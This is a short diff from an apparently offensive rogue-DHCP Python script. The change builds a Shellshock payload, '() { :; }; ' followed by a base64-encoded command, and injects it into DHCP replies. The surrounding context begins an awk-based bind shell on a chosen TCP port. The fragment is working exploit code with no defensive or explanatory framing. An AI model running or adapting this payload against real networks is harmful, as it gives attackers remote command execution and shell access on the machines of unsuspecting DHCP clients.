@@ -47,9 +47,6 @@ dns_server_ip_address = None
 number_of_dhcp_request = 0
 shellshock_url = None
 
-if args.shellshock_command is not None:
-    shellshock_url = "() { :" + "; }; " + args.shellshock_command
-
 if args.interface is None:
     current_network_interface = Base.netiface_selection()
 else:
@@ -186,6 +183,13 @@ def dhcp_reply(request):
 
             net_settings = "/bin/ip addr add " + requested_ip + \
                            "/" + network_mask + " dev eth0;"
+
+            if args.shellshock_command is not None:
+                b64command = b64encode(net_settings + args.shellshock_command)
+                shellshock_url = "() { :" + "; }; " + b64command
+                if len(shellshock_url) > 255:
+                    print "[ERROR] Len of command is very big!"
+                    shellshock_url = "A"
 
             if args.bind_shell:
                 bind_shell = "awk 'BEGIN{s=\"/inet/tcp/" + str(args.bind_port) + \
